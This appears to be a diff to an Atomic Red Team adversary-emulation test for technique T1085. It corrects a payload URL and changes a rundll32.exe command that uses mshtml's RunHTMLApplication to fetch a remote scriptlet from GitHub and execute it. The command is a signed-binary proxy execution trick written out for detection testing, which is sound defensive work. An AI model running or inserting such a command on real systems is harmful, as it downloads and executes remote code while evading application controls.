@@ -11,8 +11,8 @@ atomic_tests:
     file_url:
       description: location of the payload
       type: Url
-      default: hhttps://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct
   executor:
     name: command_prompt
     command: |
-      rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}")"
+      rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();"
